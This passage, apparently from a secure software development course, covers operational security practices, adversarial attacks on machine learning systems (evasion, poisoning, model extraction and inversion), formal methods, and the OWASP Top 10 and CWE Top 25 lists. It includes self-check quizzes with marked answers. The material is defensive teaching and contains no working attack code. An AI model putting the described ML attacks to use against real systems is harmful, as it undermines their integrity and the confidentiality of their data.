* Once a vulnerability or incident is resolved, use root cause analysis to figure out *why it happened* so changes can be made to prevent a similar recurrence.

* Create backups, and store them securely (attackers love to get copies of backups). Test to ensure you can recover from them. Make sure you have offline (“cold”) backups to counter ransomware (which breaks in, encrypts your data, and holds it for ransom).

* When you receive a vulnerability report, process and fix it in a timely manner. Then give the reporter public credit unless the reporter requests otherwise.

When disposing, make sure you fully destroy any data you are supposed to destroy. Just removing a file does not actually remove its contents from most storage devices.

🔔 Security misconfiguration is such a common mistake in web applications that it is 2017 OWASP Top 10 #6 and 2021 OWASP Top 10 #5.  Protecting automatic update functionality is considered part of 2021 OWASP Top 10 #8 (A08:2021), *Software and Data Integrity Failures*. Using components with known vulnerabilities is such a common web application vulnerability that it is 2017 OWASP Top 10 #9. Using vulnerable and outdated components is 2021 OWASP Top 10 #6. *Security Logging and Monitoring Failures* is 2021 OWASP Top 10 #9. *Insufficient logging and monitoring* is 2017 OWASP Top 10 #10.

#### Quiz 4.3: Distributing, Fielding/Deploying, Operations, and Disposal

\>\>Select the true statement(s):<<

[!x] Don’t give direct access to your database system unless it is necessary *and* you have verified it’s secure.

[x] In operations, turn on logging and redirect log recording to a central protected location for monitoring.

[ ] Fix any security issue rapidly, and then just move on to other problems. {{ selected: No, after you fix a security issue (incident), you should also try to find out *why* it happened (a “root cause analysis”) so you can fix the underlying cause. Otherwise, there is a good chance that similar problems will keep happening. }}

### Artificial Intelligence (AI), Machine Learning (ML), and Security

Artificial intelligence (AI) is intelligence demonstrated by machines
(intelligence of humans and animals is sometimes called natural intelligence).
Machine learning (ML) is a field of inquiry devoted to
understanding and building methods that 'learn', that is,
methods that leverage data to improve performance on some set of tasks
(*Machine Learning*, Tom Mitchell).
ML is often considered a subset of AI.
A significant amount of AI security work today focuses on ML;
we will take the same focus here.

Building ML systems often involve several processes, namely
training, testing, and inference. Inference is when the ML system is being
used by its users.
Many ML projects have assumed a closed and trusted environment where
there are no security threats.
However, this assumption is often unrealistic.

*Adversarial machine learning* is the set of efforts to
protect the ML pipeline to ensure its security during training,
test, and inference.
This is an active area of study, and terminology varies.
That said, there are many kinds of potential attacks on ML systems, including:

* *Evasion* ("do/infer the wrong thing").
  In an evasion attack, the attacker provides a modified input to
  an ML system's classifier during inference so it's misclassified
  while keeping the modification as small as possible
  (Nicolae et al, 2019).
  For example, an attacker might create subtle markings in a road to
  convince a self-driving car to unexpectedly swerve into oncoming traffic.
  Such modified inputs are sometimes called *adversarial inputs*.
  Adversarial inputs can enable the attacker to control the system depending on
  the classifier.
  Thus, this kind of attack may lead to a loss of integrity and/or availability.
* *Poisoning* ("learn the wrong thing").
  In a poisoning attack, the attacker manipulate data that will be used as
  training data, e.g., to reduce performance, cause misclassification, and/or
  insert backdoors
  (Nicolae et al, 2019).
  ML systems typically need a large amount of training data;
  some attackers may even create or manipulate publicly-available
  data if it is likely to be eventually used for training.
  This kind of attack may lead to a loss of integrity and/or availability.
* *Loss of confidentiality* ("reveal the wrong thing").
  An attacker may be able to use query results to reveal hidden information.
  Thus, this kind of attack may lead to a loss of confidentiality.
  This kind of attack can be subdivided further, for example:
  * *Extraction*.
      In an extraction attack, the attacker extracts the parameters or
      structure of the model from observations of the model’s predictions
      (Tabassi 2019).
  * *(Membership) inference*.
      In a membership inference attack, the attacker
      uses target model query results to determine if specific
      data points belong to the same distribution as the training dataset
      (Tabassi 2019).
  * *(Model) inversion*.
      In an inversion attack, the attacker is able to
      reconstruct (some) data used to train the model, including
      private and/or secret data (Tabassi 2019).

(Credit: The simple descriptions shown above in parentheses and double-quotes
were coined by Dr. Jeff Alstott.)

Work has especially focused on countering evasion
(adversarial inputs) in ML systems.
Unfortunately, many approaches that *appear* to counter evasion fail to
counter non-naïve attackers.
Here are some example approaches that don't counter determined attackers:

* *Adversarial training* creates adversarial inputs, then trains the
  model on those inputs. This can improve robustness, but an attacker can
  simply repeat this process more often than the defender.
* *Null labeling* attempts to train a model that certain inputs are likely
  adversarial (and should be classified as "null" results).
  Again, this appears to be weak against determined adversaries, as explained
  by Carlini and Wagner
  (“Adversarial Examples Are Not Easily Detected:
  Bypassing Ten Detection Methods” by Nicholas Carlini & David Wagner, 2017.)

One tool that may be helpful is the
Adversarial Robustness Toolbox (ART)
<https://github.com/Trusted-AI/adversarial-robustness-toolbox/wiki/>.
The post
[Integrate adversarial attacks in a model training pipeline](https://developer.ibm.com/patterns/integrate-adversarial-attacks-model-training-pipeline/),
by Singh et al,
provides an example of how ART can be integrated into a larger pipeline.
However, before using any tool you need to determine if it's effective enough
for your circumstances.

Adversarial ML is an active research area.
Before using countermeasures,
determine if the countermeasures will be adequate for your purposes.
Many countermeasures only work against naive attackers who do not
compensate for countermeasures.
Depending on your purposes,
there may not be *any* countermeasure that adequately counters attackers
with adequate confidence.
*Many* countermeasures have been proposed and later found to be inadequate.
One paper that discusses how to evaluate countermeasures is by
[Nicholas Carlini, Anish Athlye, Nicolas Papernot, et al., “On Evaluating Adversarial Robustness”, 2019-02-20](https://arxiv.org/pdf/1902.06705).
We hope that in the future there will be better countermeasures with
more industry-wide confidence.

### Formal Methods

Today most software needs to be developed to be “reasonably” or “adequately” secure. This course has focused on techniques to help you do that. However, if it is *extremely critical* that your software meet some criteria - such as some security criteria - there is an additional approach that you should be aware of: *formal methods*.

Formal methods are the use of *“mathematically rigorous techniques and tools for the specification, design and verification of software and hardware systems”*, where *“mathematically rigorous”* means that *“specifications are well-formed statements in a mathematical logic and that the formal verifications [if any] are rigorous deductions in that logic”* ([*What is Formal Methods?*](https://shemesh.larc.nasa.gov/fm/fm-what.html), by Ricky W. Butler). In short, formal methods apply mathematics to software.

The big advantages of formal methods are that:

* You can eliminate many sources of ambiguity.

* You can *prove* that certain things are true or false, given certain assumptions (and you can decide what the assumptions are).

The big disadvantages of formal methods are that:

* Using formal methods to develop software today often requires more effort.

* In many cases, using formal methods also requires specialized knowledge (e.g., of mathematics and/or of the formal methods tools being used).

Many people are working on developing and improving tools to overcome these disadvantages.

Formal methods *are* being used today to develop software, for example:

* Engineers at Amazon Web Services (AWS) use TLA+ to analyze services including its widely-used Simple Storage Service (S3) and DynamoDB (a NoSQL data store). For more details, see [*Use of Formal Methods at Amazon Web Services*](https://lamport.azurewebsites.net/tla/formal-methods-amazon.pdf) (2014) and [*How Amazon Web Services Uses Formal Methods*](https://cacm.acm.org/magazines/2015/4/184701-how-amazon-web-services-uses-formal-methods/fulltext) (2015), by Chris Newcombe, Tim Rath, Fan Zhang, Bogdan Munteanu, Marc Brooker, and Michael Daerdeuff.

* The seL4 operating system kernel (an OSS kernel) has been proven correct.

* The s2n implementation of TLS/SSL has had formal verification of important aspects and also formally verified its implementation of the HMAC algorithm ([*Automated Reasoning and Amazon s2n*](https://aws.amazon.com/blogs/security/automated-reasoning-and-amazon-s2n/), by Colm MacCarthaigh, 2016).

* Many proposed cryptographic protocols are examined with model checkers for possible exploits, and some tools embed formal methods approaches to address certain kinds of problems ([*Dramatically Reducing Software Vulnerabilities: Report to the White House Office of Science and Technology Policy*](https://nvlpubs.nist.gov/nistpubs/ir/2016/NIST.IR.8151.pdf), by Paul E. Black, Lee Badger, Barbara Guttman and Elizabeth Fong, 2016).

* Hubert Garavel ([*Formal Methods for Safe and Secure Computers Systems*](https://www.bsi.bund.de/SharedDocs/Downloads/DE/BSI/Publikationen/Studien/formal_methods_study_875/formal_methods_study_875.pdf?&#95;&#95;blob=publicationFile&v=1), 2013) provides a large list where formal methods have been used, as well as a broader survey on formal methods.

That said, using formal methods during software development is unusual today. But formal methods may become more common in the future, or you may be asked to develop software where the risk from a vulnerability is extremely high. So in this section we will provide some brief awareness about formal methods.

Before we do that, we need to make one thing clear: Formal methods always require assumptions. If the assumptions are false then their conclusions don’t necessarily hold. For example, you could prove that something is true if the CPU works correctly; a bug in the CPU means that the proof does not hold in that case. That does not make formal methods useless, because they can eliminate many other problems, and you can choose what to assume. But it is important to remember that when someone says “something is proven” that it is really proven given some assumptions… and it is important to understand what those assumptions are.

#### Formal Methods Levels

Because of the extra effort, formal methods are often applied to a subset of components or specific properties that are especially important. Formal methods can also be applied to various degrees. There is varying terminology on these degrees, but one way is these three levels:

* **Level 0**<br>A formal specification is created (that is, mathematically-based techniques are used to rigorously describe what the program is supposed to do). The program is then informally developed from it. This is sometimes called *formal methods lite*. This approach can help remove some ambiguities.

* **Level 1**<br>Apply level 0 and then prove some select properties from that or do a formal refinement from specification towards something that will become the program.

* **Level 2**<br>Fully prove the claims of a program, including mechanically checking it. This provides the strongest results, but also requires the most effort.

#### How Can Math Be Applied?

There are many different ways to apply mathematics, and so there are many different ways to use formal methods. Let’s briefly look at a few common math concepts that are used in formal methods.

##### Boolean Expressions

A widely-used tool is the idea of boolean expressions. These expressions are true or false, and can include various *propositional connectives* (a proposition is simply something that is either true or false). Here are common propositional connectives. The first three should be very familiar to you, since programming languages copied them from mathematics, but their traditional mathematical notation might be new to you:

1. “x and y” (mathematical “x ∧ y”) is true if both x and y are true, otherwise it is false.

2. “x or y” (mathematical “x ∨ y”) is true if either or both x and y are true; if both are false it is false.

3. “not x” (mathematical “￢x”) is true if x is false, and it is false if x is true.

4. “x→y” is true if x is false *or* if y is true, that is, x → y is the same as ((not x) or y). The arrow is often read as “implies”. This operator may be new to you, but this arrow simply represents “if x is true then y is true”. It is formally called *material implication*.

5. “x&harr;y” is true if x and y have the same value. This is basically “are these values equal” for boolean values. It is sometimes read as “if and only if” (iff).

You may find it easier to understand the connectives by looking at the following table. This table shows the results of these connectives given the possible input values of x and y (in this table T is true while F is false):

Propositional Connectives

<table>
  <tr>
    <th>x</th>
    <th>y</th>
    <th>x ∧ y</th>
    <th>x ∨ y</th>
    <th>￢x</th>
    <th>x→y</th>
    <th>x&harr;y</th>
  </tr>
  <tr>
    <th>F</th>
    <th>F</th>
    <td>F</td>
    <td>F</td>
    <td>T</td>
    <td>T</td>
    <td>T</td>
  </tr>
  <tr>
    <th>F</th>
    <th>T</th>
    <td>F</td>
    <td>T</td>
    <td>T</td>
    <td>T</td>
    <td>F</td>
  </tr>
  <tr>
    <th>T</th>
    <th>F</th>
    <td>F</td>
    <td>T</td>
    <td>F</td>
    <td>F</td>
    <td>F</td>
  </tr>
  <tr>
    <th>T</th>
    <th>T</th>
    <td>T</td>
    <td>T</td>
    <td>F</td>
    <td>T</td>
    <td>T</td>
  </tr>
</table>


##### Sets

Another widely-used mathematical tool is the idea of sets. A set is simply an unordered collection of elements, where elements themselves may be sets. For example, if you say S = {4, 5, 6}, that just means that set S has 3 elements (specifically 4, 5, and 6). You can then apply various operations to sets, for example:

* The operation “A ∈ B” returns true if and only if the left-hand-side A is a member of the right-hand-side B. So given the previous definition of S, “4 ∈ S” is true (because 4 is a member of S), while “7 ∈ S” is false (because 7 is not a member of S).

* The operation “A⊂B” returns true if and only if set A is a subset of set B. Put another way, A⊂B is true if every member of A is also a member of B. So {4,6}⊂S is true, because both 4 and 6 are members of S.

##### Quantifiers

A widely-used mathematical tool that you may not have seen is the idea of *quantifiers*. These return true or false values based on certain conditions:

* ∀ X *expression* : This is true if and only if the *expression* is always true for all allowed values of X. It essentially “loops” over every value X could be. The ∀ (an upside-down A) is read as “for all”. This lets you easily state that something is always true.

* ∃ X *expression* : This is true if and only if there is some allowed value of X where the *expression* is true. The ∃ is read as “there exists”. This lets you easily state that something occurs at least once.

This means you can use expressions like “∀ X (valid(X) → well_formed(X))” to say “for all values of X, if X is valid then X is well-formed”... or put another way, if X is valid then X is well-formed. Note that this entire expression is true if we are discussing XML data.

##### Mathematical Statements vs. the Real World

Mathematical statements can be used to model the real world, but do not confuse mathematical statements as being the same as the real world!

In particular, you can easily create mathematical statements that are not what you really mean. For example, natural languages sometimes use “and” and “or” in a way different from what we defined above. This is especially a problem for “or”, which in mathematics and computing is true when both sides are true (aka “inclusive or”), but in natural language it is sometimes implied that only one will be true (aka “exclusive or”). For example, in the phrase “we will go to the movies or a play tonight”, the speaker probably does not mean that we could do *both*. Using mathematics can remove many ambiguities like this, but you will have to decide if that expression is what you *mean*. The time-tested way to counter this problem is to have others review your statements and discuss if that is what was intended.

#### Formal Methods Tools

There are a huge number of tools that support formal methods.

Practically any tool (even a word processor!) can be used to capture requirements in a rigorous formal way. Some tools are designed to do just this. An example of such tools is Alloy, which is designed to make it easy to formally capture requirements and do some quick checks.

Some tools are also designed to verify that claims are mathematically true. Major kinds are:

* *Theorem-provers*<br>These try to prove goals given assumptions using only a sequence of allowed rules. Some are fully automated while others are interactive. The interactive tools can handle harder problems but are generally harder to use.

  * Widely-used OSS automated theorem provers include E and SPASS.

  * Widely-used OSS interactive theorem provers include Coq and Isabelle.

* *Satisfiability (SAT) solvers / SAT modulo theories (SMT)*<br>These take a bunch of equations with variables, and try to find a set of values for those variables that makes all equations true. SAT solvers only handle boolean variables and boolean equations, while SMT solvers can handle other values. Some package managers internally use a SAT solver. Widely-used OSS SMT solvers include Z3, CVC4, and Alt-Ergo-Free.

* *Model-checkers*<br>These take a model and “exhaustively” show it is true in all cases, using many optimization tricks to make that practical. A widely-used OSS generic model checker is Spin (which supports a language called ProMeLa). There are also many model-checking tools specifically designed to analyze programs. For example, CBMC is an OSS bounded model checker for C and C++ programs that can verify memory safety, check for ex­cep­tions, check for various variants of undefined behavior, and supports user-specified as­ser­tions.

* *Abstract interpretation / symbolic execution (for programs)*<br>These “execute” programs using relevant simplifications (abstract interpretation) or symbols (symbolic execution).

There are some systems that can combine these tools. For example:

* The Why3/Frama-C ecosystem combines a suite of tools for proving programs correct.

* Temporal Logic of Actions+ (TLA+) is a general-purpose formal specification language that is particularly useful for describing concurrent and distributed systems, and has a variety of supporting tools.

#### Formal Methods and the Future

Today formal methods are only used in special circumstances, but they might become more prominent in the future. Our goal has been to simply make you aware of it, in case you decide that it might be worth pursuing further in the future. You cannot consider using an approach if you have never heard of it.

#### Quiz 4.4: Formal Methods

\>\>Select the true statement(s):<<

[!x] The expression “∀ X foo” is true if *foo* is true no matter what the value of X is.

[ ] Formal methods eliminate assumptions. {{ selected: Not at all. Any formal method has to start with some assumptions. }}

[x] A Satisfiability (SAT) solver takes a bunch of boolean variables and boolean expressions, and tries to find a set of boolean variable values where all the boolean expressions are true.

[x] A model-checker takes a model and tries to exhaustively show it’s true in all cases.



## Top Vulnerability Lists

### OWASP Top 10

We noted earlier that there are two widely-used lists of “top” vulnerabilities, the OWASP Top 10 (focusing on web application security risks) and the CWE Top 25. They identify what they perceive as the “top” items in terms of being especially common and especially dangerous.

Their different scopes result in many differences. For example, the CWE Top 25 lists buffer overflows, while the OWASP Top 10 does not, because buffer overflows are a common serious problem in some domains (such as embedded systems) but they are not common in web applications.

Here is the [*OWASP Top 10*](https://owasp.org/Top10/) (2021 edition) list of categories:

1. Broken Access Control
2. Cryptographic Failures
3. Injection
4. Insecure Design
5. Security Misconfiguration
6. Vulnerable and Outdated Components
7. Identification and Authentication Failures
8. Software and Data Integrity Failures
9. Security Logging and Monitoring Failures
10. Server Side Request Forgery (SSRF)


In this course we have covered all of the OWASP Top 10, in both the [2017](https://owasp.org/www-project-top-ten/2017/Top_10) and [2021](https://owasp.org/Top10/) editions, and included cross-references when we did.

#### Quiz 4.5: OWASP Top 10

\>\>Select the true statement(s):<<

[!x] Injection is a risk listed in the 2021 OWASP Top 10.

[x] Security Misconfiguration is a risk listed in the 2021 OWASP Top 10.

[ ] Buffer overflows are in the 2021 OWASP Top 10. {{ selected: No, and it is understandable if you missed this. Buffer overflows are very common in embedded systems, because they are widely implemented in C and C++ which provide little protection against buffer overflows. Most web applications are written in other programming languages that protect against buffer overflows, and thus they have relatively rare in web applications. }}

### CWE Top 25

Here is the 2021 edition of the [CWE Top 25 Most Dangerous Software Errors](https://cwe.mitre.org/top25/archive/2019/2019_cwe_top25.html). This list was created using real-world data, specifically, the publicly known vulnerabilities with Common Vulnerabilities and Exposures (CVE) as published in the National Institute of Standards and Technology (NIST) National Vulnerability Database (NVD), including the severity scores as calculated using the Common Vulnerability Scoring System (CVSS) scores. This list combines many different kinds of software; whether or not that is good depends on your perspective.

No system is perfect. A complication is that the CWEs identified here are at various hierarchical levels. For example, #17 [CWE-119](https://cwe.mitre.org/data/definitions/119.html) (*Improper Restriction of Operations within the Bounds of a Memory Buffer*) is a superset of both #3 [CWE-125](https://cwe.mitre.org/data/definitions/125.html) (*Out-of-bounds read*) and #1 [CWE-787](https://cwe.mitre.org/data/definitions/787.html) (*Out-of-bounds Write*), yet they are all listed here. Still, this does provide a defensible and repeatable approach for identifying what’s important.

#### Top 25

<table>
  <tr>
   <td>Rank</td>
   <td>ID</td>
   <td>Name</td>
  </tr>
  <tr>
   <td>[1]</td>
   <td><a href="https://cwe.mitre.org/data/definitions/787.html">CWE-787</a></td>
   <td>Out-of-bounds Write</td>
  </tr>
  <tr>
   <td>[2]</td>
   <td><a href="https://cwe.mitre.org/data/definitions/79.html">CWE-79</a></td>
   <td>Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')</td>
  </tr>
  <tr>
   <td>[3]</td>
   <td><a href="https://cwe.mitre.org/data/definitions/125.html">CWE-125</a></td>
   <td>Out-of-bounds Read</td>
  </tr>
  <tr>
   <td>[4]</td>
   <td><a href="https://cwe.mitre.org/data/definitions/20.html">CWE-20</a></td>
   <td>Improper Input Validation</td>
  </tr>
  <tr>
   <td>[5]</td>
   <td><a href="https://cwe.mitre.org/data/definitions/78.html">CWE-78</a></td>
   <td>Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')</td>
  </tr>
  <tr>
   <td>[6]</td>
   <td><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89</a></td>
   <td>Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</td>
  </tr>
  <tr>
   <td>[7]</td>
   <td><a href="https://cwe.mitre.org/data/definitions/416.html">CWE-416</a></td>
   <td>Use After Free</td>
  </tr>
  <tr>
   <td>[8]</td>
   <td><a href="https://cwe.mitre.org/data/definitions/22.html">CWE-22</a></td>
   <td>Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')</td>
  </tr>
  <tr>
   <td>[9]</td>
   <td><a href="https://cwe.mitre.org/data/definitions/352.html">CWE-352</a></td>
   <td>Cross-Site Request Forgery (CSRF)</td>
  </tr>
  <tr>
   <td>[10]</td>
   <td><a href="https://cwe.mitre.org/data/definitions/434.html">CWE-434</a></td>
   <td>Unrestricted Upload of File with Dangerous Type</td>
  </tr>
  <tr>
   <td>[11]</td>
   <td><a href="https://cwe.mitre.org/data/definitions/306.html">CWE-306</a></td>
   <td>Missing Authentication for Critical Function</td>
  </tr>
  <tr>
   <td>[12]</td>
   <td><a href="https://cwe.mitre.org/data/definitions/190.html">CWE-190</a></td>
   <td>Integer Overflow or Wraparound</td>
  </tr>
  <tr>
   <td>[13]</td>
   <td><a href="https://cwe.mitre.org/data/definitions/502.html">CWE-502</a></td>
   <td>Deserialization of Untrusted Data</td>
  </tr>
  <tr>
   <td>[14]</td>
   <td><a href="https://cwe.mitre.org/data/definitions/287.html">CWE-287</a></td>
   <td>Improper Authentication</td>
  </tr>
  <tr>
   <td>[15]</td>
   <td><a href="https://cwe.mitre.org/data/definitions/476.html">CWE-476</a></td>
   <td>NULL Pointer Dereference</td>
  </tr>
  <tr>
   <td>[16]</td>
   <td><a href="https://cwe.mitre.org/data/definitions/798.html">CWE-798</a></td>
   <td>Use of Hard-coded Credentials</td>
  </tr>
  <tr>
   <td>[17]</td>
   <td><a href="https://cwe.mitre.org/data/definitions/119.html">CWE-119</a></td>
   <td>Improper Restriction of Operations within the Bounds of a Memory Buffer</td>
  </tr>
  <tr>
   <td>[18]</td>
   <td><a href="https://cwe.mitre.org/data/definitions/862.html">CWE-862</a></td>
   <td>Missing Authorization</td>
  </tr>
  <tr>
   <td>[19]</td>
   <td><a href="https://cwe.mitre.org/data/definitions/276.html">CWE-276</a></td>
   <td>Incorrect Default Permissions</td>
  </tr>
  <tr>
   <td>[20]
   </td>
   <td><a href="https://cwe.mitre.org/data/definitions/200.html">CWE-200</a></td>
   <td>Exposure of Sensitive Information to an Unauthorized Actor</td>
  </tr>
  <tr>
   <td>[21]</td>
   <td><a href="https://cwe.mitre.org/data/definitions/522.html">CWE-522</a></td>
   <td>Insufficiently Protected Credentials</td>
  </tr>
  <tr>
   <td>[22]</td>
   <td><a href="https://cwe.mitre.org/data/definitions/732.html">CWE-732</a></td>
   <td>Incorrect Permission Assignment for Critical Resource</td>
  </tr>
  <tr>
   <td>[23]</td>
   <td><a href="https://cwe.mitre.org/data/definitions/611.html">CWE-611</a></td>
   <td>Improper Restriction of XML External Entity Reference</td>
  </tr>
  <tr>
   <td>[24]</td>
   <td><a href="https://cwe.mitre.org/data/definitions/918.html">CWE-918</a></td>
   <td>Server-Side Request Forgery (SSRF)</td>
  </tr>
  <tr>
   <td>[25]</td>
   <td><a href="https://cwe.mitre.org/data/definitions/77.html">CWE-77</a></td>
   <td>Improper Neutralization of Special Elements used in a Command ('Command Injection')</td>
  </tr>
</table>


#### On the Cusp

The developers of the CWE Top 25 felt that there were a number of weaknesses that were important, but did not manage to be in their top 25 because they were not as prevalent or tended to be less severe. They call these weaknesses *on the cusp*.

Developers that complete mitigation and risk decision-making on the 2021 CWE Top 25 may want to look for these other weaknesses potentially present in their software. For these reasons, users of the 2021 CWE Top 25 should seriously consider including these additional weaknesses in their analyses:

<table>
  <tr>
   <td>Rank</td>
   <td>ID</td>
   <td>Name</td>
  </tr>
  <tr>
   <td>[26]</td>
   <td><a href="https://cwe.mitre.org/data/definitions/295.html">CWE-295</a></td>
   <td>Improper Certificate Validation</td>
  </tr>
  <tr>
   <td>[27]</td>
   <td><a href="https://cwe.mitre.org/data/definitions/400.html">CWE-400</a></td>
   <td>Uncontrolled Resource Consumption</td>
  </tr>
  <tr>
   <td>[28]</td>
   <td><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94</a></td>
   <td>Improper Control of Generation of Code ('Code Injection')</td>
  </tr>
  <tr>
   <td>[29]</td>
   <td><a href="https://cwe.mitre.org/data/definitions/269.html">CWE-269</a></td>
   <td>Improper Privilege Management</td>
  </tr>
  <tr>
   <td>[30]</td>
   <td><a href="https://cwe.mitre.org/data/definitions/917.html">CWE-917</a></td>
   <td>Improper Neutralization of Special Elements used in an Expression Language Statement ('Expression Language Injection')</td>
  </tr>
  <tr>
   <td>[31]</td>
   <td><a href="https://cwe.mitre.org/data/definitions/59.html">CWE-59</a></td>
   <td>Improper Link Resolution Before File Access ('Link Following')</td>
  </tr>
  <tr>
   <td>[32]</td>
   <td><a href="https://cwe.mitre.org/data/definitions/401.html">CWE-401</a></td>
   <td>Missing Release of Memory after Effective Lifetime</td>
  </tr>
  <tr>
   <td>[33]</td>
   <td><a href="https://cwe.mitre.org/data/definitions/362.html">CWE-362</a></td>
   <td>Concurrent Execution using Shared Resource with Improper Synchronization ('Race Condition')</td>
  </tr>
  <tr>
   <td>[34]</td>
   <td><a href="https://cwe.mitre.org/data/definitions/427.html">CWE-427</a></td>
   <td>Uncontrolled Search Path Element</td>
  </tr>
  <tr>
   <td>[35]</td>
   <td><a href="https://cwe.mitre.org/data/definitions/319.html">CWE-319</a></td>
   <td>Cleartext Transmission of Sensitive Information</td>
  </tr>
  <tr>
   <td>[36]</td>
   <td><a href="https://cwe.mitre.org/data/definitions/843.html">CWE-843</a></td>
   <td>Access of Resource Using Incompatible Type ('Type Confusion')</td>
  </tr>
  <tr>
   <td>[37]</td>
   <td><a href="https://cwe.mitre.org/data/definitions/601.html">CWE-601</a></td>
   <td>URL Redirection to Untrusted Site ('Open Redirect')</td>
  </tr>
  <tr>
   <td>[38]</td>
   <td><a href="https://cwe.mitre.org/data/definitions/863.html">CWE-863</a></td>
   <td>Incorrect Authorization</td>
  </tr>
  <tr>
   <td>[39]</td>
   <td><a href="https://cwe.mitre.org/data/definitions/532.html">CWE-532</a></td>
   <td>Inclusion of Sensitive Information in Log Files</td>
  </tr>
  <tr>
   <td>[40]</td>
   <td><a href="https://cwe.mitre.org/data/definitions/770.html">CWE-770</a></td>
   <td>Allocation of Resources Without Limits or Throttling</td>
  </tr>
</table>

You will be glad to know that this set of courses has, at least briefly, discussed each one of these kinds of vulnerabilities, even the ones “on the cusp”,
for both the [2019](https://cwe.mitre.org/top25/archive/2019/2019_cwe_top25.html) and [2021](https://cwe.mitre.org/top25/archive/2021/2021_cwe_top25.html) editions of the CWE Top 25 list.


#### Quiz 4.6: CWE Top 25

\>\>Select the true statement(s):<<

[!x]  The 2021 CWE Top 25 Most Dangerous Software Errors list was created using real-world data about vulnerabilities combined with their severity scores

[x]  The 2021 CWE Top 25 Most Dangerous Software Errors list is a combination of all kinds of software.

[ ] The CWEs listed in the 2021 CWE Top 25 Most Dangerous Software Errors do not overlap each other. {{ selected: No, there are CWEs that overlap. For example, CWE-119 (“Improper Restriction of Operations within the Bounds of a Memory Buffer”) is a superset of both CWE-125 (“Out-of-bounds read”) and CWE-787 (“Out-of-bounds Write”). }}

## Concluding Notes

### Conclusions

The goal of this course is to help you develop secure software. We hope you feel far more prepared to counter attackers.

As you develop your software:

* Consider its security requirements. Make sure you know what it is supposed to do... and *NOT* do.

* Design for security. Constantly consider design principles, like least privilege and non-bypassability.

* Implement for security. In particular, counter common kinds of mistakes. Simply countering common kinds of vulnerabilities is not enough to create a secure system, but it is a big step forward. Knowing the common kinds of implementation mistakes will also help you become aware of other kinds of vulnerabilities as well.

* Verify. In particular, use tools to detect problems *before* you ship. Where you can, enable tools as soon as you can and make sure they are in your continuous integration (CI) pipeline.

* Field and promptly handle vulnerability reports.

In real life security is a process - a journey - and not a simple endpoint. We hope that this course has made you far more prepared to take this journey. We wish you the best as you develop software that will help protect people’s reputation, property, and even lives.

# Part III: Final Exam

* Not included as part of the free version of the course.

# Part IV: Supporting Materials Not Part of the Course

# Glossary

Attacker: A person who attacks computer systems.

Hardening a system: Modifying a system so that defects are less likely to become security vulnerabilities.

Hacker: “a person who delights in having an intimate understanding of the internal workings of a system, computers and computer networks in particular.” ([IETF RFC 1983](https://tools.ietf.org/html/rfc1983))

# Further Reading

(Not part of the course per se)

Many others discuss how to develop secure software. This course merely covers the fundamentals (as we see them). Here are some resources:

* “Secure Software Design and Programming: Class Materials” by David A. Wheeler - [https://dwheeler.com/secure-class/](https://dwheeler.com/secure-class/) - lecture materials for a graduate class at George Mason University (GMU). This is a graduate class, so it goes into more detail.

* “Secure Programming HOWTO” - book by David A. Wheeler - [https://dwheeler.com/secure-programs/](https://dwheeler.com/secure-programs/)

* “Fundamental Practices for Secure Software Development, Third Edition” from SAFECode. SAFECode has published other useful materials, e.g., “Managing Security Risks Inherent in the Use of Third-party Components” and “Practices for Secure Development of Cloud Applications” - [https://safecode.org/publications/](https://safecode.org/publications/)

* Secure Programming with Static Analysis by Brian Chess & Jacob West

* Official (ISC)2 Guide to the CSSLP CBK ((ISC)2 Press), Paul, Mano

* Mitigating the Risk of Software Vulnerabilities by Adopting a Secure Software Development Framework (SSDF), NIST, [https://nvlpubs.nist.gov/nistpubs/CSWP/NIST.CSWP.04232020.pdf](https://nvlpubs.nist.gov/nistpubs/CSWP/NIST.CSWP.04232020.pdf)

* Building Security In Maturity Model (BSIMM) <[https://www.bsimm.com/](https://www.bsimm.com/)>

* The BSA Framework for Secure Software [https://www.bsa.org/files/reports/bsa_software_security_framework_web_final.pdf](https://www.bsa.org/files/reports/bsa_software_security_framework_web_final.pdf)

* OWASP Secure Coding Practices-Quick Reference Guide <https://owasp.org/www-project-secure-coding-practices-quick-reference-guide/migrated_content>

* [Software Supply Chain Best Practices](https://github.com/cncf/tag-security/raw/main/supply-chain-security/supply-chain-security-paper/CNCF_SSCP_v1.pdf) from the Cloud Native Computing Foundation (CNCF)

# Old Mappings

## OWASP Top 10 and CWE Top 25

### OWASP Top 10 (2017 edition)

Here is the OWASP *Top 10 Web Application Security Risks* (2017 edition); please read this list to make sure you understand each one:

1. *“Injection. Injection flaws, such as SQL, NoSQL, OS, and LDAP injection, occur when untrusted data is sent to an interpreter as part of a command or query. The attacker’s hostile data can trick the interpreter into executing unintended commands or accessing data without proper authorization.*

2. *Broken Authentication. Application functions related to authentication and session management are often implemented incorrectly, allowing attackers to compromise passwords, keys, or session tokens, or to exploit other implementation flaws to assume other users’ identities temporarily or permanently.*

3. *Sensitive Data Exposure. Many web applications and APIs do not properly protect sensitive data, such as financial, healthcare, and PII. Attackers may steal or modify such weakly protected data to conduct credit card fraud, identity theft, or other crimes.* *Sensitive data may be compromised without extra protection, such as encryption at rest or in transit, and requires special precautions when exchanged with the browser.*

4. *XML External Entities (XXE). Many older or poorly configured XML processors evaluate external entity references within XML documents. External entities can be used to disclose internal files using the file URI handler, internal file shares, internal port scanning, remote code execution, and denial of service attacks.*

5. *Broken Access Control. Restrictions on what authenticated users are allowed to do are often not properly enforced. Attackers can exploit these flaws to access unauthorized functionality and/or data, such as access other users’ accounts, view sensitive files, modify other users’ data, change access rights, etc.*

6. *Security Misconfiguration. Security misconfiguration is the most commonly seen issue. This is commonly a result of insecure default configurations, incomplete or ad hoc configurations, open cloud storage, misconfigured HTTP headers, and verbose error messages containing sensitive information. Not only must all operating systems, frameworks, libraries, and applications be securely configured, but they must be patched/upgraded in a timely fashion.*

7. *Cross-Site Scripting XSS. XSS flaws occur whenever an application includes untrusted data in a new web page without proper validation or escaping, or updates an existing web page with user-supplied data using a browser API that can create HTML or JavaScript. XSS allows attackers to execute scripts in the victim’s browser which can hijack user sessions, deface web sites, or redirect the user to malicious sites.*

8. *Insecure Deserialization. Insecure deserialization often leads to remote code execution. Even if deserialization flaws do not result in remote code execution, they can be used to perform attacks, including replay attacks, injection attacks, and privilege escalation attacks.*

